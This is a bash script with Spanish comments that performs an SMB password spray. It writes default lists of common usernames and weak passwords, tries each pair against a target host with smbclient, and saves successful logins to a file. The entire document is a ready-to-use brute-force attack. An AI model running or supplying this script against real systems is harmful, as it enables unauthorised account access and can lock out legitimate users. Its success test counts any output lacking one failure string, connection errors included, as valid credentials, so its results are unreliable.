#!/bin/bash
# SMB Password Spray - Ataque simple de fuerza bruta
# Prueba 1 contraseña contra muchos usuarios

target=$1
password_list="password.txt"
user_list="users.txt"

# Si no hay listas, usa defaults comunes
if [ ! -f "$user_list" ]; then
    cat > users.txt << EOF
Administrator
admin
guest
user
test
backup
EOF
    user_list="users.txt"
fi

if [ ! -f "$password_list" ]; then
    cat > password.txt << EOF
password
123456
admin
Password1
Welcome1
password123
EOF
    password_list="password.txt"
fi

echo "[+] Starting SMB password spray on $target"
echo "[+] Users: $(cat $user_list | wc -l)"
echo "[+] Passwords: $(cat $password_list | wc -l)"

# Prueba cada password contra cada usuario
while read password; do
    echo "[*] Probando password: $password"
    
    while read user; do
        # Intenta autenticar
        echo -n "  Probando $user:$password... "
        
        if smbclient -L //$target -U "$user%$password" 2>&1 | grep -q "session setup failed"; then
            echo "FAIL"
        else
            echo -e "\n[+] ¡CREDENCIALES VÁLIDAS!: $user:$password"
            echo "$user:$password" >> valid_creds.txt
        fi
    done < "$user_list"
    
done < "$password_list"

if [ -f "valid_creds.txt" ]; then
    echo "[+] Credenciales encontradas guardadas en valid_creds.txt"
fi
